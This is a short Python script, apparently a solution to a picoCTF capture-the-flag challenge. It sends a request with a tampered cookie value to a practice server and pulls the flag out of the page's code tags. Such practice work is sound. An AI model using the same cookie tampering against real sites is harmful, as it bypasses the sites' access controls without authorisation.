import requests
import re

url = 'http://mercury.picoctf.net:64944/check'

cookies = dict(name='18')

req = requests.get(url, cookies=cookies)

print(re.findall('(?<=\<code\>).*?(?=\</code\>)', req.text)[0])